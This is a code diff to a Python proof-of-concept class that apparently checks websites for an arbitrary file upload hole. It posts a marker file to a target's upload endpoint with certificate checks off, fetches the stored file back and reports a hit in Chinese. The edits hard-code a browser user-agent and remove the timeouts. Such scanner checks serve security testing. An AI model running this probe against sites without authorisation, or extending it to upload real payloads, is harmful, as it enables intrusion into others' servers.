@@ -24,16 +24,17 @@ import sys
 from urllib.parse import urlparse
 from requests.packages.urllib3 import disable_warnings
 disable_warnings()
-path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
-sys.path.append(path)
-from modules import get_user_agent
+# path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+# sys.path.append(path)
+# from modules import get_user_agent
 
 
 class poc:
     def __init__(self, url, proxies):
         self.url = url
         self.headers = {
-            'User-Agent': get_user_agent.get_user_agent(),
+            # 'User-Agent': get_user_agent.get_user_agent(),
+            'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0'
         }
         self.value_list = []
         self.result_text = ""
@@ -57,10 +58,10 @@ class poc:
             "files[]": ('11.txt', '{}'.format(payload).encode(), None)
         }
         try:
-            result = requests.post(url=url, files=data, headers=self.headers, proxies=self.proxies, verify=False, timeout=3)
+            result = requests.post(url=url, files=data, headers=self.headers, proxies=self.proxies, verify=False)
             result_json = result.json()
             end_url = "{}://{}/uploads".format(scheme, netloc) + json.loads(result_json['info'])["0"]["savepath"].replace("\\", "") + json.loads(result_json['info'])["0"]["savename"]
-            end_result = requests.get(url=end_url, headers=self.headers, proxies=self.proxies, verify=False, timeout=3)
+            end_result = requests.get(url=end_url, headers=self.headers, proxies=self.proxies, verify=False)
             if payload in end_result.text:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意文件上传漏洞\033[0m
@@ -86,5 +87,4 @@ class poc:
              return self.result_text
         else:
             return False
-
 
